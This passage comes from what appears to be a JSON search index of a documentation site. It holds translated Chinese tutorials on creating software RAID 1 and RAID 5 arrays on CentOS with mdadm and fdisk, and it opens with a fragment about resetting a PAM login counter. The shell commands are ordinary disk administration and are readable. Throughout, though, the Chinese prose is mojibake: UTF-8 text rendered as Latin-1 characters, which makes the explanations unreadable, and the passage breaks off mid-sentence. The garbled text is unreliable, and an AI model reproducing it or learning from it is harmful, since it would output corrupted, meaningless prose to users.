é‡ç½®ç™»é™†è®¡æ•°å™¨ passwd root # é‡ç½®å¯†ç ","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-system-service-PAM-module.html","loc":"/yq-doc-source-docs-operating-system-linux-system-service-PAM-module.html"},{"title":"ç”¨ä¸¤å—ç£ç›˜åˆ›å»º RAID 1 (é•œåƒ)","text":"å‚è€ƒ:: ä½œè€…: Babin Lonston è¯‘è€…: LCTT è¯‘è€…: struggling è¯„è®º: https://linux.cn/portal.php?mod=comment&id=6093&idtype=aid RAID é•œåƒ æ„å‘³ç€ç›¸åŒæ•°æ®çš„å®Œæ•´å…‹éš†ï¼ˆæˆ–é•œåƒï¼‰ï¼Œåˆ†åˆ«å†™å…¥åˆ°ä¸¤ä¸ªç£ç›˜ä¸­ã€‚ åˆ›å»º RAID 1 è‡³å°‘éœ€è¦ä¸¤ä¸ªç£ç›˜ï¼Œè€Œä¸”ä»…ç”¨äºè¯»å–æ€§èƒ½æˆ–è€…å¯é æ€§è¦æ¯”æ•°æ®å­˜å‚¨å®¹é‡æ›´é‡è¦çš„åœºåˆã€‚ åˆ›å»ºé•œåƒæ˜¯ä¸ºäº†é˜²æ­¢å› ç¡¬ç›˜æ•…éšœå¯¼è‡´æ•°æ®ä¸¢å¤±ã€‚ é•œåƒä¸­çš„æ¯ä¸ªç£ç›˜åŒ…å«æ•°æ®çš„å®Œæ•´å‰¯æœ¬ã€‚ å½“ä¸€ä¸ªç£ç›˜å‘ç”Ÿæ•…éšœæ—¶ï¼Œç›¸åŒçš„æ•°æ®å¯ä»¥ä»å…¶å®ƒæ­£å¸¸ç£ç›˜ä¸­è¯»å–ã€‚ è€Œåï¼Œå¯ä»¥ä»æ­£åœ¨è¿è¡Œçš„è®¡ç®—æœºä¸­ç›´æ¥æ›´æ¢å‘ç”Ÿæ•…éšœçš„ç£ç›˜ï¼Œæ— éœ€ä»»ä½•ä¸­æ–­ã€‚ RAID 1 çš„ç‰¹ç‚¹ é•œåƒå…·æœ‰è‰¯å¥½çš„æ€§èƒ½ã€‚ ç£ç›˜åˆ©ç”¨ç‡ä¸º50ï¼…ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœæˆ‘ä»¬æœ‰ä¸¤ä¸ªç£ç›˜æ¯ä¸ª500GBï¼Œæ€»å…±æ˜¯1TBï¼Œä½†åœ¨é•œåƒä¸­å®ƒåªä¼šæ˜¾ç¤º500GBã€‚ åœ¨é•œåƒå¦‚æœä¸€ä¸ªç£ç›˜å‘ç”Ÿæ•…éšœä¸ä¼šæœ‰æ•°æ®ä¸¢å¤±ï¼Œå› ä¸ºä¸¤ä¸ªç£ç›˜ä¸­çš„å†…å®¹ç›¸åŒã€‚ è¯»å–æ€§èƒ½ä¼šæ¯”å†™å…¥æ€§èƒ½æ›´å¥½ã€‚ è¦æ±‚ åˆ›å»º RAID 1 è‡³å°‘è¦æœ‰ä¸¤ä¸ªç£ç›˜ï¼Œä½ ä¹Ÿå¯ä»¥æ·»åŠ æ›´å¤šçš„ç£ç›˜ï¼Œç£ç›˜æ•°éœ€ä¸º2ï¼Œ4ï¼Œ6ï¼Œ8ç­‰å¶æ•°ã€‚ è¦æ·»åŠ æ›´å¤šçš„ç£ç›˜ï¼Œä½ çš„ç³»ç»Ÿå¿…é¡»æœ‰ RAID ç‰©ç†é€‚é…å™¨ï¼ˆç¡¬ä»¶å¡ï¼‰ã€‚ è¿™é‡Œï¼Œæˆ‘ä»¬ä½¿ç”¨è½¯ä»¶ RAID ä¸æ˜¯ç¡¬ä»¶ RAIDï¼Œå¦‚æœä½ çš„ç³»ç»Ÿæœ‰ä¸€ä¸ªå†…ç½®çš„ç‰©ç†ç¡¬ä»¶ RAID å¡ï¼Œ ä½ å¯ä»¥ä»å®ƒçš„åŠŸèƒ½ç•Œé¢æˆ–ä½¿ç”¨ Ctrl + I é”®æ¥è®¿é—®å®ƒã€‚ RAID çš„çº§åˆ«å’Œæ¦‚å¿µ åŸæ–‡: < https://linux.cn/article-6085-1.html >`_ æœ¬åœ°: RAID çš„çº§åˆ«å’Œæ¦‚å¿µ æœåŠ¡å™¨é…ç½®: - æ“ä½œç³»ç»Ÿ : CentOS 6.5 FinalIP - åœ°å€ : 192.168.0.226 - ä¸»æœºå : rd1.tecmintlocal.com - ç£ç›˜ 1 [20GB] : /dev/sdb - ç£ç›˜ 2 [20GB] : /dev/sdc æœ¬æ–‡å°†æŒ‡å¯¼ä½ åœ¨ Linux å¹³å°ä¸Šä½¿ç”¨ mdadm ï¼ˆç”¨äºåˆ›å»ºå’Œç®¡ç† RAID ï¼‰ä¸€æ­¥æ­¥çš„å»ºç«‹ä¸€ä¸ªè½¯ä»¶ RAID 1 ï¼ˆé•œåƒï¼‰ã€‚ åŒæ ·çš„åšæ³•ä¹Ÿé€‚ç”¨äºå¦‚ RedHatï¼ŒCentOSï¼ŒFedora ç­‰ Linux å‘è¡Œç‰ˆã€‚ ç¬¬1æ­¥ï¼šå®‰è£…æ‰€éœ€è½¯ä»¶å¹¶ä¸”æ£€æŸ¥ç£ç›˜ æ­£å¦‚æˆ‘å‰é¢æ‰€è¯´ï¼Œåœ¨ Linux ä¸­æˆ‘ä»¬éœ€è¦ä½¿ç”¨ mdadm è½¯ä»¶æ¥åˆ›å»ºå’Œç®¡ç† RAIDã€‚ æ‰€ä»¥ï¼Œè®©æˆ‘ä»¬ç”¨ yum æˆ– apt-get çš„è½¯ä»¶åŒ…ç®¡ç†å·¥å…·åœ¨ Linux ä¸Šå®‰è£… mdadm è½¯ä»¶åŒ…: yum install mdadm [åœ¨ RedHat ç³»ç»Ÿ]### apt-get install mdadm [åœ¨ Debain ç³»ç»Ÿ] ä¸€æ—¦å®‰è£…å¥½ mdadm åŒ…ï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤æ¥æ£€æŸ¥ç£ç›˜æ˜¯å¦å·²ç»é…ç½®å¥½: mdadm -E /dev/sd[b-c] ç¬¬2æ­¥ï¼šä¸º RAID åˆ›å»ºåˆ†åŒº æ­£å¦‚æˆ‘æåˆ°çš„ï¼Œæˆ‘ä»¬ä½¿ç”¨æœ€å°‘çš„ä¸¤ä¸ªåˆ†åŒº /dev/sdb å’Œ /dev/sdc æ¥åˆ›å»º RAID 1ã€‚ æˆ‘ä»¬é¦–å…ˆä½¿ç”¨ fdisk å‘½ä»¤æ¥åˆ›å»ºè¿™ä¸¤ä¸ªåˆ†åŒºå¹¶æ›´æ”¹å…¶ç±»å‹ä¸º raid: fdisk /dev/sdb æŒ‰ç…§ä¸‹é¢çš„è¯´æ˜ æŒ‰ n åˆ›å»ºæ–°çš„åˆ†åŒºã€‚ ç„¶åæŒ‰ P é€‰æ‹©ä¸»åˆ†åŒºã€‚ æ¥ä¸‹æ¥é€‰æ‹©åˆ†åŒºå·ä¸º1ã€‚ æŒ‰ä¸¤æ¬¡å›è½¦é”®é»˜è®¤å°†æ•´ä¸ªå®¹é‡åˆ†é…ç»™å®ƒã€‚ ç„¶åï¼ŒæŒ‰ P æ¥æ‰“å°åˆ›å»ºå¥½çš„åˆ†åŒºã€‚ æŒ‰ L ï¼Œåˆ—å‡ºæ‰€æœ‰å¯ç”¨çš„ç±»å‹ã€‚ æŒ‰ t ä¿®æ”¹åˆ†åŒºç±»å‹ã€‚ é”®å…¥ fd è®¾ç½®ä¸º Linux çš„ RAID ç±»å‹ï¼Œç„¶åæŒ‰ Enter ç¡®è®¤ã€‚ ç„¶åå†æ¬¡ä½¿ç”¨ p æŸ¥çœ‹æˆ‘ä»¬æ‰€åšçš„æ›´æ”¹ã€‚ ä½¿ç”¨ w ä¿å­˜æ›´æ”¹ã€‚ åœ¨åˆ›å»º\"/dev/sdb\"åˆ†åŒºåï¼Œæ¥ä¸‹æ¥æŒ‰ç…§åŒæ ·çš„æ–¹æ³•åˆ›å»ºåˆ†åŒº /dev/sdc: fdisk /dev/sdc ä¸€æ—¦è¿™ä¸¤ä¸ªåˆ†åŒºåˆ›å»ºæˆåŠŸåï¼Œä½¿ç”¨ç›¸åŒçš„å‘½ä»¤æ¥æ£€æŸ¥ sdb å’Œ sdc åˆ†åŒºå¹¶ç¡®è®¤ RAID åˆ†åŒºçš„ç±»å‹å¦‚ä¸Šå›¾æ‰€ç¤º: mdadm -E /dev/sd[b-c] æ³¨è§£ æ­£å¦‚ä½ åœ¨ä¸Šå›¾æ‰€çœ‹åˆ°çš„ï¼Œåœ¨ sdb1 å’Œ sdc1 ä¸­æ²¡æœ‰ä»»ä½•å¯¹ RAID çš„å®šä¹‰ï¼Œè¿™å°±æ˜¯æˆ‘ä»¬æ²¡æœ‰æ£€æµ‹åˆ°è¶…çº§å—çš„åŸå› ã€‚ ç¬¬3æ­¥ï¼šåˆ›å»º RAID 1 è®¾å¤‡ æ¥ä¸‹æ¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ¥åˆ›å»ºä¸€ä¸ªåä¸º /dev/md0 çš„\"RAID 1\"è®¾å¤‡å¹¶éªŒè¯å®ƒ: mdadm --create /dev/md0 --level=mirror --raid-devices=2 /dev/sd[b-c]1### cat /proc/mdstat æ¥ä¸‹æ¥ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤æ¥æ£€æŸ¥ RAID è®¾å¤‡ç±»å‹å’Œ RAID é˜µåˆ—: mdadm -E /dev/sd[b-c]1### mdadm --detail /dev/md0 æ£€æŸ¥ RAID è®¾å¤‡é˜µåˆ— ä»ä¸Šå›¾ä¸­ï¼Œäººä»¬å¾ˆå®¹æ˜“ç†è§£ï¼ŒRAID 1 å·²ç»åˆ›å»ºå¥½äº†ï¼Œ ä½¿ç”¨äº† /dev/sdb1 å’Œ /dev/sdc1 åˆ†åŒºï¼Œä½ ä¹Ÿå¯ä»¥çœ‹åˆ°çŠ¶æ€ä¸º resyncingï¼ˆé‡æ–°åŒæ­¥ä¸­ï¼‰ã€‚ ç¬¬4æ­¥ï¼šåœ¨ RAID è®¾å¤‡ä¸Šåˆ›å»ºæ–‡ä»¶ç³»ç»Ÿ ç»™ md0 ä¸Šåˆ›å»º ext4 æ–‡ä»¶ç³»ç»Ÿ: mkfs.ext4 /dev/md0 åˆ›å»º RAID è®¾å¤‡æ–‡ä»¶ç³»ç»Ÿ æ¥ä¸‹æ¥ï¼ŒæŒ‚è½½æ–°åˆ›å»ºçš„æ–‡ä»¶ç³»ç»Ÿåˆ°\"/mnt/raid1\"ï¼Œå¹¶åˆ›å»ºä¸€äº›æ–‡ä»¶ï¼ŒéªŒè¯åœ¨æŒ‚è½½ç‚¹çš„æ•°æ®: mkdir /mnt/raid1 mount /dev/md0 /mnt/raid1/ touch /mnt/raid1/tecmint.txt echo \"tecmint raid setups\" > /mnt/raid1/tecmint.txt æŒ‚è½½ RAID è®¾å¤‡ ä¸ºäº†åœ¨ç³»ç»Ÿé‡æ–°å¯åŠ¨è‡ªåŠ¨æŒ‚è½½ RAID 1ï¼Œéœ€è¦åœ¨ fstab æ–‡ä»¶ä¸­æ·»åŠ æ¡ç›®ã€‚ æ‰“å¼€ /etc/fstab æ–‡ä»¶å¹¶æ·»åŠ ä»¥ä¸‹è¡Œ: /dev/md0 /mnt/raid1 ext4 defaults 0 0 è‡ªåŠ¨æŒ‚è½½ Raid è®¾å¤‡ è¿è¡Œ mount -av ï¼Œæ£€æŸ¥ fstab ä¸­çš„æ¡ç›®æ˜¯å¦æœ‰é”™è¯¯: mount -av æ£€æŸ¥ fstab ä¸­çš„é”™è¯¯ æ¥ä¸‹æ¥ï¼Œä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤ä¿å­˜ RAID çš„é…ç½®åˆ°æ–‡ä»¶\"mdadm.conf\"ä¸­: mdadm --detail --scan --verbose >> /etc/mdadm.conf ä¿å­˜ Raid çš„é…ç½® ä¸Šè¿°é…ç½®æ–‡ä»¶åœ¨ç³»ç»Ÿé‡å¯æ—¶ä¼šè¯»å–å¹¶åŠ è½½ RAID è®¾å¤‡ã€‚ ç¬¬5æ­¥ï¼šåœ¨ç£ç›˜æ•…éšœåæ£€æŸ¥æ•°æ® æˆ‘ä»¬çš„ä¸»è¦ç›®çš„æ˜¯ï¼Œå³ä½¿åœ¨ä»»ä½•ç£ç›˜æ•…éšœæˆ–æ­»æœºæ—¶å¿…é¡»ä¿è¯æ•°æ®æ˜¯å¯ç”¨çš„ã€‚ è®©æˆ‘ä»¬æ¥çœ‹çœ‹ï¼Œå½“ä»»ä½•ä¸€ä¸ªç£ç›˜ä¸å¯ç”¨æ—¶ä¼šå‘ç”Ÿä»€ä¹ˆ: mdadm --detail /dev/md0 éªŒè¯ RAID è®¾å¤‡ åœ¨ä¸Šé¢çš„å›¾ç‰‡ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°åœ¨ RAID ä¸­æœ‰2ä¸ªè®¾å¤‡æ˜¯å¯ç”¨çš„ï¼Œ å¹¶ä¸” Active Devices æ˜¯2ã€‚ ç°åœ¨è®©æˆ‘ä»¬çœ‹çœ‹ï¼Œå½“ä¸€ä¸ªç£ç›˜æ‹”å‡ºï¼ˆç§»é™¤ sdc ç£ç›˜ï¼‰æˆ–æŸååä¼šå‘ç”Ÿä»€ä¹ˆ: ls -l /dev | grep sd### mdadm --detail /dev/md0 æµ‹è¯• RAID è®¾å¤‡ ç°åœ¨ï¼Œåœ¨ä¸Šé¢çš„å›¾ç‰‡ä¸­ä½ å¯ä»¥çœ‹åˆ°ï¼Œä¸€ä¸ªç£ç›˜ä¸è§äº†ã€‚ æˆ‘ä»è™šæ‹Ÿæœºä¸Šåˆ é™¤äº†ä¸€ä¸ªç£ç›˜ã€‚æ­¤æ—¶è®©æˆ‘ä»¬æ¥æ£€æŸ¥æˆ‘ä»¬å®è´µçš„æ•°æ®: cd /mnt/raid1/### cat tecmint.txt éªŒè¯ RAID æ•°æ® ä½ å¯ä»¥çœ‹åˆ°æˆ‘ä»¬çš„æ•°æ®ä»ç„¶å¯ç”¨ã€‚ ç”±æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥äº†è§£ RAID 1ï¼ˆé•œåƒï¼‰çš„ä¼˜åŠ¿ã€‚ åœ¨æ¥ä¸‹æ¥çš„æ–‡ç« ä¸­ï¼Œæˆ‘ä»¬å°†çœ‹åˆ°å¦‚ä½•è®¾ç½®ä¸€ä¸ª RAID 5 æ¡å¸¦åŒ–åˆ†å¸ƒå¼å¥‡å¶æ ¡éªŒã€‚ å¸Œæœ›è¿™å¯ä»¥å¸®åŠ©ä½ äº†è§£ RAID 1ï¼ˆé•œåƒï¼‰æ˜¯å¦‚ä½•å·¥ä½œçš„ã€‚","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Tutorial-Raid-Create-RAID-1-with-two-disks-(mirror).html","loc":"/yq-doc-source-docs-operating-system-linux-Tutorial-Raid-Create-RAID-1-with-two-disks-(mirror).html"},{"title":"åˆ›å»º RAID 5 (æ¡å¸¦åŒ–ä¸åˆ†å¸ƒå¼å¥‡å¶æ ¡éªŒ)","text":"å‚è€ƒ:: ä½œè€…: Babin Lonston è¯‘è€…: LCTT è¯‘è€…: struggling åœ¨ RAID 5 ä¸­ï¼Œæ•°æ®æ¡å¸¦åŒ–åå­˜å‚¨åœ¨åˆ†å¸ƒå¼å¥‡å¶æ ¡éªŒçš„å¤šä¸ªç£ç›˜ä¸Šã€‚ åˆ†å¸ƒå¼å¥‡å¶æ ¡éªŒçš„æ¡å¸¦åŒ–æ„å‘³ç€å®ƒå°†å¥‡å¶æ ¡éªŒä¿¡æ¯å’Œæ¡å¸¦åŒ–æ•°æ®åˆ†å¸ƒåœ¨å¤šä¸ªç£ç›˜ä¸Šï¼Œè¿™æ ·ä¼šæœ‰å¾ˆå¥½çš„æ•°æ®å†—ä½™ã€‚ åœ¨ Linux ä¸­é…ç½® RAID 5 å¯¹äºæ­¤ RAID çº§åˆ«å®ƒè‡³å°‘åº”è¯¥æœ‰ä¸‰ä¸ªæˆ–æ›´å¤šä¸ªç£ç›˜ã€‚ RAID 5 é€šå¸¸è¢«ç”¨äºå¤§è§„æ¨¡ç”Ÿäº§ç¯å¢ƒä¸­ï¼Œä»¥èŠ±è´¹æ›´å¤šçš„æˆæœ¬æ¥æä¾›æ›´å¥½çš„æ•°æ®å†—ä½™æ€§èƒ½ã€‚ ä»€ä¹ˆæ˜¯å¥‡å¶æ ¡éªŒ å¥‡å¶æ ¡éªŒæ˜¯åœ¨æ•°æ®å­˜å‚¨ä¸­æ£€æµ‹é”™è¯¯æœ€ç®€å•çš„å¸¸è§æ–¹å¼ã€‚ å¥‡å¶æ ¡éªŒä¿¡æ¯å­˜å‚¨åœ¨æ¯ä¸ªç£ç›˜ä¸­ï¼Œæ¯”å¦‚è¯´ï¼Œæˆ‘ä»¬æœ‰4ä¸ªç£ç›˜ï¼Œå…¶ä¸­ç›¸å½“äºä¸€ä¸ªç£ç›˜å¤§å°çš„ç©ºé—´è¢«åˆ†å‰²å»å­˜å‚¨æ‰€æœ‰ç£ç›˜çš„å¥‡å¶æ ¡éªŒä¿¡æ¯ã€‚ å¦‚æœä»»ä½•ä¸€ä¸ªç£ç›˜å‡ºç°æ•…éšœï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æ›´æ¢æ•…éšœç£ç›˜åï¼Œä»å¥‡å¶æ ¡éªŒä¿¡æ¯é‡å»ºå¾—åˆ°åŸæ¥çš„æ•°æ®ã€‚ RAID 5 çš„ä¼˜ç‚¹å’Œç¼ºç‚¹ æä¾›æ›´å¥½çš„æ€§èƒ½ã€‚ æ”¯æŒå†—ä½™å’Œå®¹é”™ã€‚ æ”¯æŒçƒ­å¤‡ä»½ã€‚ å°†ç”¨æ‰ä¸€ä¸ªç£ç›˜çš„å®¹é‡å­˜å‚¨å¥‡å¶æ ¡éªŒä¿¡æ¯ã€‚ å•ä¸ªç£ç›˜å‘ç”Ÿæ•…éšœåä¸ä¼šä¸¢å¤±æ•°æ®ã€‚æˆ‘ä»¬å¯ä»¥æ›´æ¢æ•…éšœç¡¬ç›˜åä»å¥‡å¶æ ¡éªŒä¿¡æ¯ä¸­é‡å»ºæ•°æ®ã€‚ é€‚åˆäºé¢å‘äº‹åŠ¡å¤„ç†çš„ç¯å¢ƒï¼Œè¯»æ“ä½œä¼šæ›´å¿«ã€‚ ç”±äºå¥‡å¶æ ¡éªŒå ç”¨èµ„æºï¼Œå†™æ“ä½œä¼šæ…¢ä¸€äº›ã€‚ é‡å»ºéœ€è¦å¾ˆé•¿çš„æ—¶é—´ã€‚ è¦æ±‚ åˆ›å»º RAID 5 æœ€å°‘éœ€è¦3ä¸ªç£ç›˜ï¼Œä½ ä¹Ÿå¯ä»¥æ·»åŠ æ›´å¤šçš„ç£ç›˜ï¼Œ å‰ææ˜¯ä½ è¦æœ‰å¤šç«¯å£çš„ä¸“ç”¨ç¡¬ä»¶ RAID æ§åˆ¶å™¨ã€‚åœ¨è¿™é‡Œï¼Œæˆ‘ä»¬ä½¿ç”¨\"mdadm\"åŒ…æ¥åˆ›å»ºè½¯ä»¶ RAIDã€‚ mdadm æ˜¯ä¸€ä¸ªå…è®¸æˆ‘ä»¬åœ¨ Linux ä¸‹é…ç½®å’Œç®¡ç† RAID è®¾å¤‡çš„åŒ…ã€‚ é»˜è®¤æƒ…å†µä¸‹æ²¡æœ‰ RAID çš„é…ç½®æ–‡ä»¶ï¼Œæˆ‘ä»¬åœ¨åˆ›å»ºå’Œé…ç½® RAID åå¿…é¡»å°†é…ç½®æ–‡ä»¶ä¿å­˜åœ¨ä¸€ä¸ªå•ç‹¬çš„æ–‡ä»¶ mdadm.conf ä¸­ã€‚ åœ¨è¿›ä¸€æ­¥å­¦ä¹ ä¹‹å‰ï¼Œæˆ‘å»ºè®®ä½ é€šè¿‡ä¸‹é¢çš„æ–‡ç« å»äº†è§£ Linux ä¸­ RAID çš„åŸºç¡€çŸ¥è¯† åŸæ–‡: ä»‹ç» RAID çš„çº§åˆ«å’Œæ¦‚å¿µ ä½¿ç”¨ mdadm å·¥å…·åˆ›å»ºè½¯ä»¶ RAID 0 ï¼ˆæ¡å¸¦åŒ–ï¼‰ ç”¨ä¸¤å—ç£ç›˜åˆ›å»º RAID 1ï¼ˆé•œåƒï¼‰ æˆ‘çš„æœåŠ¡å™¨è®¾ç½®: æ“ä½œç³»ç»Ÿ : CentOS 6.5 FinalIP åœ°å€ : 192.168.0.227 ä¸»æœºå : rd5.tecmintlocal.com ç£ç›˜ 1 [20GB] : /dev/sdb ç£ç›˜ 2 [20GB] : /dev/sdc ç£ç›˜ 3 [20GB] : /dev/sdd è¿™æ˜¯9ç¯‡ç³»åˆ—æ•™ç¨‹çš„ç¬¬4éƒ¨åˆ†ï¼Œ åœ¨è¿™é‡Œæˆ‘ä»¬è¦åœ¨ Linux ç³»ç»Ÿæˆ–æœåŠ¡å™¨ä¸Šä½¿ç”¨ä¸‰ä¸ª20GBï¼ˆåä¸º/dev/sdb, /dev/sdc å’Œ /dev/sddï¼‰ çš„ç£ç›˜å»ºç«‹å¸¦æœ‰åˆ†å¸ƒå¼å¥‡å¶æ ¡éªŒçš„è½¯ä»¶ RAID 5ã€‚ ç¬¬1æ­¥ï¼šå®‰è£… mdadm å¹¶æ£€éªŒç£ç›˜ ä½¿ç”¨ CentOS 6.5 Final ç‰ˆæœ¬æ¥åˆ›å»º RAID è®¾ç½®ï¼Œä½†åŒæ ·çš„åšæ³•ä¹Ÿé€‚ç”¨äºå…¶ä»– Linux å‘è¡Œç‰ˆ: lsb_release -a ifconfig | grep inet CentOS 6.5 æ‘˜è¦ å¦‚æœä½ æŒ‰ç…§æˆ‘ä»¬çš„ RAID ç³»åˆ—å»é…ç½®çš„ï¼Œæˆ‘ä»¬å‡è®¾ä½ å·²ç»å®‰è£…äº†\"mdadm\"åŒ…ï¼Œå¦‚æœæ²¡æœ‰ï¼Œæ ¹æ®ä½ çš„ Linux å‘è¡Œç‰ˆä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤å®‰è£…: yum install mdadm # [åœ¨ RedHat ç³»ç»Ÿ] apt-get install mdadm # [åœ¨ Debain ç³»ç»Ÿ] \"mdadm\"åŒ…å®‰è£…åï¼Œå…ˆä½¿ç”¨`fdisk`å‘½ä»¤åˆ—å‡ºæˆ‘ä»¬åœ¨ç³»ç»Ÿä¸Šå¢åŠ çš„ä¸‰ä¸ª20GBçš„ç¡¬ç›˜: fdisk -l | grep sd å®‰è£… mdadm å·¥å…· ç°åœ¨è¯¥æ£€æŸ¥è¿™ä¸‰ä¸ªç£ç›˜æ˜¯å¦å­˜åœ¨ RAID å—ï¼Œä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤æ¥æ£€æŸ¥: mdadm -E /dev/sd[b-d] mdadm --examine /dev/sdb /dev/sdc /dev/sdd # æˆ– æ£€æŸ¥ Raid ç£ç›˜ æ³¨è§£ ä¸Šé¢çš„å›¾ç‰‡è¯´æ˜ï¼Œæ²¡æœ‰æ£€æµ‹åˆ°ä»»ä½•è¶…çº§å—ã€‚ æ‰€ä»¥ï¼Œè¿™ä¸‰ä¸ªç£ç›˜ä¸­æ²¡æœ‰å®šä¹‰ RAIDã€‚è®©æˆ‘ä»¬ç°åœ¨å¼€å§‹åˆ›å»ºä¸€ä¸ªå§ï¼ ç¬¬2æ­¥ï¼šä¸ºç£ç›˜åˆ›å»º RAID åˆ†åŒº é¦–å…ˆï¼Œåœ¨åˆ›å»º RAID å‰ç£ç›˜ï¼ˆ/dev/sdb, /dev/sdc å’Œ /dev/sddï¼‰å¿…é¡»æœ‰åˆ†åŒºï¼Œ å› æ­¤ï¼Œåœ¨è¿›è¡Œä¸‹ä¸€æ­¥ä¹‹å‰ï¼Œå…ˆä½¿ç”¨ fdisk å‘½ä»¤è¿›è¡Œåˆ†åŒº: fdisk /dev/sdb fdisk /dev/sdc fdisk /dev/sdd åˆ›å»º /dev/sdb åˆ†åŒº, è¯·æŒ‰ç…§ä¸‹é¢çš„è¯´æ˜åœ¨ /dev/sdb ç¡¬ç›˜ä¸Šåˆ›å»ºåˆ†åŒºã€‚ æŒ‰ n åˆ›å»ºæ–°çš„åˆ†åŒºã€‚ ç„¶åæŒ‰ P é€‰æ‹©ä¸»åˆ†åŒºã€‚é€‰æ‹©ä¸»åˆ†åŒºæ˜¯å› ä¸ºè¿˜æ²¡æœ‰å®šä¹‰è¿‡åˆ†åŒºã€‚ æ¥ä¸‹æ¥é€‰æ‹©åˆ†åŒºå·ä¸º1ã€‚é»˜è®¤å°±æ˜¯1ã€‚ è¿™é‡Œæ˜¯é€‰æ‹©æŸ±é¢å¤§å°ï¼Œæˆ‘ä»¬æ²¡å¿…è¦é€‰æ‹©æŒ‡å®šçš„å¤§å°ï¼Œå› ä¸ºæˆ‘ä»¬éœ€è¦ä¸º RAID ä½¿ç”¨æ•´ä¸ªåˆ†åŒºï¼Œæ‰€ä»¥åªéœ€æŒ‰ä¸¤æ¬¡ Enter é”®é»˜è®¤å°†æ•´ä¸ªå®¹é‡åˆ†é…ç»™å®ƒã€‚ ç„¶åï¼ŒæŒ‰ P æ¥æ‰“å°åˆ›å»ºå¥½çš„åˆ†åŒºã€‚ æ”¹å˜åˆ†åŒºç±»å‹ï¼ŒæŒ‰ L å¯ä»¥åˆ—å‡ºæ‰€æœ‰å¯ç”¨çš„ç±»å‹ã€‚ æŒ‰ t ä¿®æ”¹åˆ†åŒºç±»å‹ã€‚ è¿™é‡Œä½¿ç”¨ fd è®¾ç½®ä¸º RAID çš„ç±»å‹ã€‚ ç„¶åå†æ¬¡ä½¿ç”¨ p æŸ¥çœ‹æˆ‘ä»¬æ‰€åšçš„æ›´æ”¹ã€‚ ä½¿ç”¨ w ä¿å­˜æ›´æ”¹ã€‚ åˆ›å»º sdb åˆ†åŒº æ³¨è§£ æˆ‘ä»¬ä»è¦æŒ‰ç…§ä¸Šé¢çš„æ­¥éª¤æ¥åˆ›å»º sdc å’Œ sdd çš„åˆ†åŒºã€‚ åˆ›å»º /dev/sdc åˆ†åŒº, ç°åœ¨ï¼Œé€šè¿‡ä¸‹é¢çš„æˆªå›¾ç»™å‡ºåˆ›å»º sdc å’Œ sdd ç£ç›˜åˆ†åŒºçš„æ–¹æ³•ï¼Œæˆ–è€…ä½ å¯ä»¥æŒ‰ç…§ä¸Šé¢çš„æ­¥éª¤: fdisk /dev/sdc åˆ›å»º sdc åˆ†åŒº åˆ›å»º /dev/sdd åˆ†åŒº: fdisk /dev/sdd åˆ›å»º sdd åˆ†åŒº åˆ›å»ºåˆ†åŒºåï¼Œæ£€æŸ¥ä¸‰ä¸ªç£ç›˜ sdb, sdc, sdd çš„å˜åŒ–: mdadm --examine /dev/sdb /dev/sdc /dev/sdd mdadm -E /dev/sd[b-c] æ£€æŸ¥ç£ç›˜å˜åŒ– æ³¨è§£ åœ¨ä¸Šé¢çš„å›¾ç‰‡ä¸­ï¼Œç£ç›˜çš„ç±»å‹æ˜¯ fdã€‚ ç°åœ¨åœ¨æ–°åˆ›å»ºçš„åˆ†åŒºæ£€æŸ¥ RAID å—ã€‚å¦‚æœæ²¡æœ‰æ£€æµ‹åˆ°è¶…çº§å—ï¼Œæˆ‘ä»¬å°±èƒ½å¤Ÿç»§ç»­ä¸‹ä¸€æ­¥ï¼Œåœ¨è¿™äº›ç£ç›˜ä¸­åˆ›å»ºä¸€ä¸ªæ–°çš„ RAID 5 é…ç½®ã€‚ åœ¨åˆ†åŒºä¸­æ£€æŸ¥ RAID ç¬¬3æ­¥ï¼šåˆ›å»º md è®¾å¤‡ md0 ç°åœ¨ä½¿ç”¨æ‰€æœ‰æ–°åˆ›å»ºçš„åˆ†åŒº(sdb1, sdc1 å’Œ sdd1) åˆ›å»ºä¸€ä¸ª RAID è®¾å¤‡\"md0\"ï¼ˆå³ /dev/md0ï¼‰ï¼Œä½¿ç”¨ä»¥ä¸‹å‘½ä»¤: mdadm --create /dev/md0 --level=5 --raid-devices=3 /dev/sdb1 /dev/sdc1 /dev/sdd1 ### mdadm -C /dev/md0 -l=5 -n=3 /dev/sd[b-d]1 ### æˆ– åˆ›å»º RAID è®¾å¤‡åï¼Œæ£€æŸ¥å¹¶ç¡®è®¤ RAIDï¼Œä» mdstat ä¸­è¾“å‡ºä¸­å¯ä»¥çœ‹åˆ°åŒ…æ‹¬çš„è®¾å¤‡çš„ RAID çº§åˆ«: cat /proc/mdstat éªŒè¯ Raid è®¾å¤‡ å¦‚æœä½ æƒ³ç›‘è§†å½“å‰çš„åˆ›å»ºè¿‡ç¨‹ï¼Œä½ å¯ä»¥ä½¿ç”¨ watch å‘½ä»¤ï¼Œ å°† cat /proc/mdstat ä¼ é€’ç»™å®ƒï¼Œå®ƒä¼šåœ¨å±å¹•ä¸Šæ˜¾ç¤ºä¸”æ¯éš”1ç§’åˆ·æ–°ä¸€æ¬¡: watch -n1 cat /proc/mdstat ç›‘æ§ RAID 5 æ„å»ºè¿‡ç¨‹ Raid 5 è¿‡ç¨‹æ¦‚è¦ åˆ›å»º RAID åï¼Œä½¿ç”¨ä»¥ä¸‹å‘½ä»¤éªŒè¯ RAID è®¾å¤‡: mdadm -E /dev/sd[b-d]1 éªŒè¯ Raid çº§åˆ« æ³¨è§£ å› ä¸ºå®ƒæ˜¾ç¤ºä¸‰ä¸ªç£ç›˜çš„ä¿¡æ¯ï¼Œä¸Šè¿°å‘½ä»¤çš„è¾“å‡ºä¼šæœ‰ç‚¹é•¿ã€‚ æ¥ä¸‹æ¥ï¼ŒéªŒè¯ RAID é˜µåˆ—ï¼Œå‡å®šåŒ…å« RAID 